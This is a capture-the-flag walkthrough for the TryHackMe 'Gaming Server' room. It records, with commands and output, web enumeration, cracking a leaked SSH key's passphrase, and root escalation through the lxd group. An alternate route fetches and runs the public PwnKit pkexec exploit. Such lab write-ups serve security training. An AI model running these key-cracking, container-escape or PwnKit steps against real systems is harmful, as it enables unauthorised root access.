Room: https://tryhackme.com/room/gamingserver

boot2root machine for FIT and bsides guatemala CTF

⚠️ STOP

Stuck and need a nudge in the right direction?

➡️ Try the hints page before reading the full solution: https://github.com/garthheff/CTF-Hints/blob/main/gamingserver.md

---

## 1. Port Scanning

I started with a full port scan and service detection against the target.

```bash
nmap -sV -p- 10.65.178.161
```

Output:

```text
root@ip-10-65-82-102:~# nmap -sV -p- 10.65.178.161
Starting Nmap 7.80 ( https://nmap.org ) at 2026-05-06 09:24 BST
mass_dns: warning: Unable to open /etc/resolv.conf. Try using --system-dns or specify valid servers with --dns-servers
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using --system-dns or specify valid servers with --dns-servers
Nmap scan report for 10.65.178.161
Host is up (0.000077s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.62 seconds
```

Only SSH and HTTP were open. That made the web server the first likely path for enumeration.

---

## 2. Web Enumeration

### robots.txt

The `robots.txt` file exposed an uploads directory.

```text
http://10.65.178.161/robots.txt
```

Output:

```text
user-agent: *
Allow: /
/uploads/
```

The uploads directory contained interesting files:

```text
http://10.65.178.161/uploads/manifesto.txt
```

```text
http://10.65.178.161/uploads/dict.lst
```

The `dict.lst` file was especially useful later because it could be used as a custom wordlist.

### Page Source

The source of the homepage contained a useful comment.

```text
view-source:http://10.65.178.161/
```

Output:

```html
</body> <!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. --> </html>
```

This gave us a likely username:

```text
john
```

---

## 3. Directory Brute Forcing

I used Gobuster against the web root with common web extensions.

```bash
gobuster dir -u http://10.65.178.161/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak,old
```

Output:

```text
root@ip-10-65-82-102:~# gobuster dir -u http://10.65.178.161/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html,js,bak,old
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.65.178.161/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,old,php,txt,html,js
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/about.php            (Status: 200) [Size: 2213]
/about.html           (Status: 200) [Size: 1435]
/index.html           (Status: 200) [Size: 2762]
/index.html           (Status: 200) [Size: 2762]
/robots.txt           (Status: 200) [Size: 33]
/robots.txt           (Status: 200) [Size: 33]
/secret               (Status: 301) [Size: 315] [--> http://10.65.178.161/secret/]
/server-status        (Status: 403) [Size: 278]
/uploads              (Status: 301) [Size: 316] [--> http://10.65.178.161/uploads/]
Progress: 32298 / 32305 (99.98%)
===============================================================
Finished
===============================================================
```

The important finding here was:

```text
/secret
```

---

## 4. Finding an Encrypted SSH Private Key

Inside the secret directory there was a private key file.

```text
http://10.65.178.161/secret/secretKey
```

The file started like this:

```text
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,REDACTED

[ENCRYPTED PRIVATE KEY REDACTED]
-----END RSA PRIVATE KEY-----
```

The important part is:

```text
Proc-Type: 4,ENCRYPTED
```

That tells us the SSH private key is encrypted with a passphrase. Since the site also exposed `dict.lst`, we can use that wordlist to crack the key passphrase.

Download the key:

```bash
wget http://10.65.178.161/secret/secretKey
```

Copy it into a working filename:

```bash
cp secretKey john_id_rsa
```

---

## 5. Cracking the SSH Key Passphrase

First I accidentally passed `tee` as an argument to `ssh2john.py`. The correct method is to pipe the output into `tee`.

Incorrect command:

```bash
/opt/john/ssh2john.py john_id_rsa tee john_hash.txt
```

Correct command:

```bash
/opt/john/ssh2john.py john_id_rsa | tee john_hash.txt
```

Output:

```text
root@ip-10-65-82-102:~# /opt/john/ssh2john.py john_id_rsa | tee john_hash.txt
john_id_rsa:$sshng$1$16$REDACTED$1200$REDACTED
```

Crack the hash with John using the downloaded wordlist:

```bash
john john_hash.txt --wordlist=dict.lst
```

Output:

```text
root@ip-10-65-82-102:~# john john_hash.txt --wordlist=dict.lst
Note: This format may emit false positives, so it will keep trying even after finding a
possible candidate.
Warning: detected hash type "SSH", but the string is also recognized as "ssh-opencl"
Use the "--format=ssh-opencl" option to force loading these as that type instead
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
[REDACTED]          (john_id_rsa)
1g 0:00:00:00 DONE (2026-05-06 09:44) 100.0g/s 22200p/s 22200c/s 22200C/s baseball..starwars
Session completed.
```

The key passphrase was recovered, but it has been removed from this write-up.

Set the correct permissions on the key:

```bash
chmod 600 john_id_rsa
```

SSH in as `john`:

```bash
ssh -i john_id_rsa john@10.65.178.161
```

Output:

```text
root@ip-10-65-82-102:~# ssh -i john_id_rsa john@10.65.178.161
The authenticity of host '10.65.178.161 (10.65.178.161)' can't be established.
ECDSA key fingerprint is SHA256:LO5bYqjXqLnB39jxUzFMiOaZ1YnyFGGXUmf1edL6R9o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.65.178.161' (ECDSA) to the list of known hosts.
Enter passphrase for key 'john_id_rsa':
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-76-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  6 08:44:52 UTC 2026

  System load:  0.0               Processes:           101
  Usage of /:   41.1% of 9.78GB   Users logged in:     0
  Memory usage: 17%               IP address for ens5: 10.65.178.161
  Swap usage:   0%


0 packages can be updated.
0 updates are security updates.


Last login: Mon Jul 27 20:17:26 2020 from 10.8.5.10
```

---

## 6. User Flag

```bash
cat user.txt
```

Output:

```text
john@exploitable:~$ cat user.txt
[USER FLAG REDACTED]
```

---

## 7. Local Enumeration

### Current User and Groups

```bash
id
```

Output:

```text
john@exploitable:~$ id
uid=1000(john) gid=1000(john) groups=1000(john),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)
```

The interesting groups are:

```text
sudo
lxd
```

The `sudo` group looked interesting, but the SSH key passphrase was not the Linux account password.

```bash
sudo -l
```

Output:

```text
john@exploitable:~$ sudo -l
[sudo] password for john:
Sorry, try again.
[sudo] password for john:
Sorry, try again.
[sudo] password for john:
sudo: 3 incorrect password attempts
```

This meant sudo was not useful unless the actual user password could be found.

### SUID Enumeration

```bash
find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
```

Output:

```text
john@exploitable:~$ find / -perm -4000 -type f -printf '%u %g %m %p\n' 2>/dev/null
root root 4755 /bin/mount
root root 4755 /bin/umount
root root 4755 /bin/su
root root 4755 /bin/fusermount
root root 4755 /bin/ping
root root 4755 /usr/lib/eject/dmcrypt-get-device
root root 6755 /usr/lib/snapd/snap-confine
root root 4755 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
root root 4755 /usr/lib/openssh/ssh-keysign
root messagebus 4754 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
root root 4755 /usr/lib/policykit-1/polkit-agent-helper-1
root root 4755 /usr/bin/chsh
root root 4755 /usr/bin/newgidmap
root root 4755 /usr/bin/traceroute6.iputils
root root 4755 /usr/bin/sudo
root root 4755 /usr/bin/passwd
root root 4755 /usr/bin/gpasswd
root root 4755 /usr/bin/chfn
daemon daemon 6755 /usr/bin/at
root root 4755 /usr/bin/pkexec
root root 4755 /usr/bin/newgrp
root root 4755 /usr/bin/newuidmap
root root 4755 /snap/core/8268/bin/mount
root root 4755 /snap/core/8268/bin/ping
root root 4755 /snap/core/8268/bin/ping6
root root 4755 /snap/core/8268/bin/su
root root 4755 /snap/core/8268/bin/umount
root root 4755 /snap/core/8268/usr/bin/chfn
root root 4755 /snap/core/8268/usr/bin/chsh
root root 4755 /snap/core/8268/usr/bin/gpasswd
root root 4755 /snap/core/8268/usr/bin/newgrp
root root 4755 /snap/core/8268/usr/bin/passwd
root root 4755 /snap/core/8268/usr/bin/sudo
root systemd-resolve 4754 /snap/core/8268/usr/lib/dbus-1.0/dbus-daemon-launch-helper
root root 4755 /snap/core/8268/usr/lib/openssh/ssh-keysign
root root 6755 /snap/core/8268/usr/lib/snapd/snap-confine
root dip 4754 /snap/core/8268/usr/sbin/pppd
root root 4755 /snap/core/7270/bin/mount
root root 4755 /snap/core/7270/bin/ping
root root 4755 /snap/core/7270/bin/ping6
root root 4755 /snap/core/7270/bin/su
root root 4755 /snap/core/7270/bin/umount
root root 4755 /snap/core/7270/usr/bin/chfn
root root 4755 /snap/core/7270/usr/bin/chsh
root root 4755 /snap/core/7270/usr/bin/gpasswd
root root 4755 /snap/core/7270/usr/bin/newgrp
root root 4755 /snap/core/7270/usr/bin/passwd
root root 4755 /snap/core/7270/usr/bin/sudo
root systemd-resolve 4754 /snap/core/7270/usr/lib/dbus-1.0/dbus-daemon-launch-helper
root root 4755 /snap/core/7270/usr/lib/openssh/ssh-keysign
root root 6755 /snap/core/7270/usr/lib/snapd/snap-confine
root dip 4754 /snap/core/7270/usr/sbin/pppd
```

Nothing obvious was needed from the SUID list.

### Home Directory Checks

```bash
ls -la
```

Output:

```text
john@exploitable:~$ ls -la
total 60
drwxr-xr-x 8 john john  4096 Jul 27  2020 .
drwxr-xr-x 3 root root  4096 Feb  5  2020 ..
lrwxrwxrwx 1 john john     9 Jul 27  2020 .bash_history -> /dev/null
-rw-r--r-- 1 john john   220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 john john  3771 Apr  4  2018 .bashrc
drwx------ 2 john john  4096 Feb  5  2020 .cache
drwxr-x--- 3 john john  4096 Jul 27  2020 .config
drwx------ 3 john john  4096 Feb  5  2020 .gnupg
drwxrwxr-x 3 john john  4096 Jul 27  2020 .local
-rw-r--r-- 1 john john   807 Apr  4  2018 .profile
drwx------ 2 john john  4096 Feb  5  2020 .ssh
-rw-r--r-- 1 john john     0 Feb  5  2020 .sudo_as_admin_successful
-rw-rw-r-- 1 john john    33 Feb  5  2020 user.txt
drwxr-xr-x 2 root root  4096 Feb  5  2020 .vim
-rw------- 1 root root 12070 Jul 27  2020 .viminfo
```

The `.viminfo` file was owned by root and could not be read as `john`:

```bash
cat .viminfo
```

Output:

```text
john@exploitable:~$ cat .viminfo
cat: .viminfo: Permission denied
```

### Writable Directories

```bash
find / -writable -type d 2>/dev/null
```

Output:

```text
find / -writable -type d 2>/dev/null
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service
/sys/fs/cgroup/unified/user.slice/user-1000.slice/user@1000.service/init.scope
/home/john
/home/john/.ssh
/home/john/.local
/home/john/.local/share
/home/john/.local/share/nano
/home/john/.config
/home/john/.config/lxc
/home/john/.cache
/home/john/.gnupg
/home/john/.gnupg/private-keys-v1.d
/tmp
/tmp/.font-unix
/tmp/.X11-unix
/tmp/.Test-unix
/tmp/.ICE-unix
/tmp/.XIM-unix
/var/crash
/var/lib/lxcfs/proc
/var/lib/lxcfs/cgroup
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1000.slice/user@1000.service/init.scope
/var/lib/php/sessions
/var/tmp
/proc/1856/task/1856/fd
/proc/1856/fd
/proc/1856/map_files
/run/user/1000
/run/user/1000/systemd
/run/user/1000/gnupg
/run/screen
/run/lock
/dev/mqueue
/dev/shm
```

The key privilege escalation lead remained the `lxd` group.

---

## 8. LXD Privilege Escalation

The user was in the `lxd` group, so I checked whether LXD was installed and usable.

```bash
lxc version
lxc image list
lxc storage list
lxc profile list
```

Earlier checks showed LXD was installed, but there were no local images:

```text
Client version: 3.0.3
Server version: 3.0.3
```

```text
+-------+-------------+--------+-------------+------+------+-------------+
| ALIAS | FINGERPRINT | PUBLIC | DESCRIPTION | ARCH | SIZE | UPLOAD DATE |
+-------+-------------+--------+-------------+------+------+-------------+
```

Because there were no images, I needed to build an Alpine LXD image on the AttackBox and transfer it to the target.

---

## 9. Building an Alpine LXD Image on the AttackBox

On the AttackBox:

```bash
git clone https://github.com/saghul/lxd-alpine-builder.git
```

Output:

```text
root@ip-10-65-82-102:~# git clone https://github.com/saghul/lxd-alpine-builder.git
Cloning into 'lxd-alpine-builder'...
remote: Enumerating objects: 57, done.
remote: Counting objects: 100% (15/15), done.
remote: Compressing objects: 100% (11/11), done.
remote: Total 57 (delta 6), reused 8 (delta 4), pack-reused 42 (from 1)
Unpacking objects: 100% (57), 3.12 MiB | 6.24 MiB/s, done.
```

Move into the folder and build Alpine:

```bash
cd lxd-alpine-builder
sudo ./build-alpine
```

Output:

```text
root@ip-10-65-82-102:~/lxd-alpine-builder# sudo ./build-alpine
sudo: unable to resolve host ip-10-65-82-102: Name or service not known
Determining the latest release... v3.23
Using static apk from http://dl-cdn.alpinelinux.org/alpine//v3.23/main/x86_64
Downloading alpine-keys-2.6-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
Downloading apk-tools-static-3.0.6-r0.apk
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
tar: Ignoring unknown extended header keyword 'APK-TOOLS.checksum.SHA1'
alpine-devel@lists.alpinelinux.org-6165ee59.rsa.pub: OK
Verified OK
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3632  100  3632    0     0   2233      0  0:00:01  0:00:01 --:--:--  2233
--2026-05-06 09:58:17--  http://alpine.mirror.wearetriple.com/MIRRORS.txt
Resolving alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)... 93.187.10.24, 2a00:1f00:dc06:10::6
Connecting to alpine.mirror.wearetriple.com (alpine.mirror.wearetriple.com)|93.187.10.24|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3632 (3.5K) [text/plain]
Saving to: ‘/root/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’

/root/lxd-alpine-bu 100%[===================>]   3.55K  --.-KB/s    in 0s

2026-05-06 09:58:17 (193 MB/s) - ‘/root/lxd-alpine-builder/rootfs/usr/share/alpine-mirrors/MIRRORS.txt’ saved [3632/3632]

Selecting mirror http://pkg.adfinis-on-exoscale.ch/alpine//v3.23/main
( 1/27) Installing alpine-baselayout-data (3.7.2-r0)
( 2/27) Installing musl (1.2.5-r23)
( 3/27) Installing busybox (1.37.0-r30)
  Executing busybox-1.37.0-r30.post-install
( 4/27) Installing busybox-binsh (1.37.0-r30)
( 5/27) Installing alpine-baselayout (3.7.2-r0)
  Executing alpine-baselayout-3.7.2-r0.pre-install
  Executing alpine-baselayout-3.7.2-r0.post-install
( 6/27) Installing bridge (1.5-r5)
( 7/27) Installing ifupdown-ng (0.12.1-r7)
( 8/27) Installing openrc-user (0.63-r1)
( 9/27) Installing libcap2 (2.78-r0)
(10/27) Installing openrc (0.63-r1)
  Executing openrc-0.63-r1.post-install
(11/27) Installing mdev-conf (4.9-r0)
(12/27) Installing busybox-mdev-openrc (1.37.0-r30)
(13/27) Installing alpine-conf (3.21.0-r0)
(14/27) Installing alpine-keys (2.6-r0)
(15/27) Installing alpine-release (3.23.4-r0)
(16/27) Installing libcrypto3 (3.5.6-r0)
(17/27) Installing libssl3 (3.5.6-r0)
(18/27) Installing ssl_client (1.37.0-r30)
(19/27) Installing zlib (1.3.2-r0)
(20/27) Installing libapk (3.0.6-r0)
(21/27) Installing ca-certificates-bundle (20260413-r0)
(22/27) Installing apk-tools (3.0.6-r0)
(23/27) Installing busybox-openrc (1.37.0-r30)
(24/27) Installing busybox-suid (1.37.0-r30)
(25/27) Installing scanelf (1.3.8-r2)
(26/27) Installing musl-utils (1.2.5-r23)
(27/27) Installing alpine-base (3.23.4-r0)
Executing busybox-1.37.0-r30.trigger
OK: 9903 KiB in 27 packages
```

List the generated files:

```bash
ls -la
```

Output:

```text
root@ip-10-65-82-102:~/lxd-alpine-builder# ls -la
total 7252
drwxr-xr-x  3 root root    4096 May  6 09:58 .
drwxr-xr-x 51 root root    4096 May  6 09:57 ..
-rw-r--r--  1 root root 3259593 May  6 09:57 alpine-v3.13-x86_64-20210218_0139.tar.gz
-rw-r--r--  1 root root 4105013 May  6 09:58 alpine-v3.23-x86_64-20260506_0958.tar.gz
-rwxr-xr-x  1 root root    8064 May  6 09:57 build-alpine
drwxr-xr-x  8 root root    4096 May  6 09:57 .git
-rw-r--r--  1 root root   26530 May  6 09:57 LICENSE
-rw-r--r--  1 root root     768 May  6 09:57 README.md
```

Serve the image from the AttackBox:

```bash
python3 -m http.server 8000
```

Output:

```text
root@ip-10-65-82-102:~/lxd-alpine-builder# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

---

## 10. Importing the LXD Image on the Target

On the target as `john`, download the Alpine image:

```bash
cd /tmp
wget http://10.65.82.102:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
```

Output:

```text
john@exploitable:/var/www/html$ cd /tmp
john@exploitable:/tmp$ wget http://10.65.82.102:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
--2026-05-06 08:59:47--  http://10.65.82.102:8000/alpine-v3.13-x86_64-20210218_0139.tar.gz
Connecting to 10.65.82.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3259593 (3.1M) [application/gzip]
Saving to: ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’

alpine-v3.13-x86_64-20210218_0139.tar.gz        100%[=====================================================================================================>]   3.11M  --.-KB/s    in 0.007s

2026-05-06 08:59:47 (457 MB/s) - ‘alpine-v3.13-x86_64-20210218_0139.tar.gz’ saved [3259593/3259593]
```

Import the image:

```bash
lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
```

Output:

```text
john@exploitable:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
Image imported with fingerprint: cd73881adaac667ca3529972c7b380af240a9e3b09730f8c8e4e6a23e1a7892b
```

A second import was not needed because the image was already present:

```text
john@exploitable:/tmp$ lxc image import ./alpine-v3.13-x86_64-20210218_0139.tar.gz --alias alpine
Error: Image with same fingerprint already exists
```

Confirm the image exists:

```bash
lxc image list
```

Output:

```text
john@exploitable:/tmp$ lxc image list
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| ALIAS  | FINGERPRINT  | PUBLIC |          DESCRIPTION          |  ARCH  |  SIZE  |         UPLOAD DATE         |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
| alpine | cd73881adaac | no     | alpine v3.13 (20210218_01:39) | x86_64 | 3.11MB | May 6, 2026 at 8:59am (UTC) |
+--------+--------------+--------+-------------------------------+--------+--------+-----------------------------+
```

---

## 11. Creating a Privileged Container

Create a privileged container:

```bash
lxc init alpine privesc -c security.privileged=true
```

Output:

```text
john@exploitable:/tmp$ lxc init alpine privesc -c security.privileged=true
Creating privesc
```

Start it and enter a shell:

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

Output:

```text
john@exploitable:/tmp$ lxc start privesc
john@exploitable:/tmp$ lxc exec privesc /bin/sh
~ # whoami
root
~ # cd /root
~ # ls
~ # ls -la
total 12
drwx------    2 root     root          4096 May  6 09:00 .
drwxr-xr-x   19 root     root          4096 May  6 09:00 ..
-rw-------    1 root     root            26 May  6 09:00 .ash_history
~ # id
uid=0(root) gid=0(root)
```

At this point, we were root inside the container, but the host filesystem was not mounted yet.

Trying to access `/mnt/root` failed:

```text
~ # cd /mnt/root
/bin/sh: cd: can't cd to /mnt/root: No such file or directory
```

Back on the target, the container had no devices attached:

```bash
lxc config device show privesc
```

Output:

```text
john@exploitable:/tmp$ lxc config device show privesc
{}
```

Stop the container and add the host root filesystem as a disk device:

```bash
lxc stop privesc
lxc config device add privesc host-root disk source=/ path=/mnt/root
lxc config device show privesc
```

Output:

```text
john@exploitable:/tmp$ lxc stop privesc
john@exploitable:/tmp$ lxc config device add privesc host-root disk source=/ path=/mnt/root
Device host-root added to privesc
john@exploitable:/tmp$ lxc config device show privesc
host-root:
  path: /mnt/root
  source: /
  type: disk
```

Restart and enter the container again:

```bash
lxc start privesc
lxc exec privesc /bin/sh
```

Check the mount:

```bash
ls -la /mnt
ls -la /mnt/root
```

Output:

```text
john@exploitable:/tmp$ lxc start privesc
john@exploitable:/tmp$ lxc exec privesc /bin/sh
~ # ls -la /mnt
total 12
drwxr-xr-x    3 root     root          4096 May  6 09:02 .
drwxr-xr-x   19 root     root          4096 May  6 09:02 ..
drwxr-xr-x   24 root     root          4096 Feb  5  2020 root
~ # ls -la /mnt/root
total 2091128
drwxr-xr-x   24 root     root          4096 Feb  5  2020 .
drwxr-xr-x    3 root     root          4096 May  6 09:02 ..
drwxr-xr-x    2 root     root          4096 Feb  5  2020 bin
drwxr-xr-x    3 root     root          4096 Feb  5  2020 boot
drwxr-xr-x    2 root     root          4096 Feb  5  2020 cdrom
drwxr-xr-x    4 root     root          4096 Aug  5  2019 dev
drwxr-xr-x   93 root     root          4096 Jul 27  2020 etc
drwxr-xr-x    3 root     root          4096 Feb  5  2020 home
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img -> boot/initrd.img-4.15.0-76-generic
lrwxrwxrwx    1 root     root            33 Feb  5  2020 initrd.img.old -> boot/initrd.img-4.15.0-76-generic
drwxr-xr-x   22 root     root          4096 Feb  5  2020 lib
drwxr-xr-x    2 root     root          4096 Aug  5  2019 lib64
drwx------    2 root     root         16384 Feb  5  2020 lost+found
drwxr-xr-x    2 root     root          4096 Aug  5  2019 media
drwxr-xr-x    2 root     root          4096 Aug  5  2019 mnt
drwxr-xr-x    2 root     root          4096 Aug  5  2019 opt
drwxr-xr-x    2 root     root          4096 Apr 24  2018 proc
drwx------    3 root     root          4096 Feb  5  2020 root
drwxr-xr-x   13 root     root          4096 Aug  5  2019 run
drwxr-xr-x    2 root     root         12288 Feb  5  2020 sbin
drwxr-xr-x    4 root     root          4096 Feb  5  2020 snap
drwxr-xr-x    2 root     root          4096 Aug  5  2019 srv
-rw-------    1 root     root     2141192192 Feb  5  2020 swap.img
drwxr-xr-x    2 root     root          4096 Apr 24  2018 sys
drwxrwxrwt   10 root     root          4096 May  6 08:59 tmp
drwxr-xr-x   10 root     root          4096 Aug  5 2019 usr
drwxr-xr-x   14 root     root          4096 Feb  5 2020 var
lrwxrwxrwx    1 root     root            30 Feb  5 2020 vmlinuz -> boot/vmlinuz-4.15.0-76-generic
lrwxrwxrwx    1 root     root            30 Feb  5 2020 vmlinuz.old -> boot/vmlinuz-4.15.0-76-generic
```

The host filesystem was now mounted at:

```text
/mnt/root
```

---

## 12. Root Flag

Read the root flag from the mounted host filesystem:

```bash
cat /mnt/root/root/root.txt
```

Output:

```text
~ # cat /mnt/root/root/root.txt
[ROOT FLAG REDACTED]
```


---

## Alternate Privilege Escalation Path: PwnKit

An alternate route to root was possible using PwnKit. This path was not the main LXD route used above, but it worked on the target and is worth noting as an alternate escalation method.

PwnKit targets vulnerable `pkexec` installations. The SUID enumeration showed `pkexec` was present:

```text
root root 4755 /usr/bin/pkexec
```

### Downloading PwnKit on the AttackBox

On the AttackBox, download the PwnKit binary:

```bash
wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
```

Output:

```text
root@ip-10-65-82-102:~# wget https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
--2026-05-06 10:09:35--  https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.110.133, 185.199.108.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.110.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit              100%[===================>]  17.62K  --.-KB/s    in 0.001s

2026-05-06 10:09:35 (25.8 MB/s) - ‘PwnKit’ saved [18040/18040]
```

The AttackBox was already serving files over HTTP on port `8000`, so the same server could be used to transfer the binary to the target.

### Downloading and Running PwnKit on the Target

On the target as `john`, download the binary into `/tmp`:

```bash
cd /tmp
wget http://10.65.82.102:8000/PwnKit
```

Output:

```text
john@exploitable:/tmp$ wget http://10.65.82.102:8000/PwnKit
--2026-05-06 09:10:51--  http://10.65.82.102:8000/PwnKit
Connecting to 10.65.82.102:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 18040 (18K) [application/octet-stream]
Saving to: ‘PwnKit’

PwnKit                            100%[============================================================>]  17.62K  --.-KB/s    in 0s

2026-05-06 09:10:51 (73.7 MB/s) - ‘PwnKit’ saved [18040/18040]
```

Make it executable and run it:

```bash
chmod +x PwnKit
./PwnKit
```

Output:

```text
john@exploitable:/tmp$ chmod +x PwnKit
john@exploitable:/tmp$ ./PwnKit
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@exploitable:/tmp# whoami
root
root@exploitable:/tmp#
```

This provided a root shell directly.

Note: In a write-up, I would present the LXD route as the cleaner privilege escalation path because it comes directly from the discovered `lxd` group membership. PwnKit is useful to mention as an alternate path because `/usr/bin/pkexec` was present and the target was vulnerable.

---

## Summary

Initial access came from web enumeration:

1. Found `/uploads` from `robots.txt`.
2. Found `dict.lst` in uploads.
3. Found `john` as a likely username from an HTML comment.
4. Found `/secret` with Gobuster.
5. Downloaded an encrypted SSH private key from `/secret/secretKey`.
6. Converted the key with `ssh2john.py`.
7. Cracked the SSH key passphrase with John using `dict.lst`.
8. Logged in as `john` over SSH.

Privilege escalation came from group membership:

1. `john` was a member of the `lxd` group.
2. Built an Alpine LXD image on the AttackBox.
3. Served it over HTTP.
4. Downloaded and imported it on the target.
5. Created a privileged LXD container.
6. Mounted the host root filesystem into the container.
7. Read the root flag from the mounted host filesystem.

Key lessons:

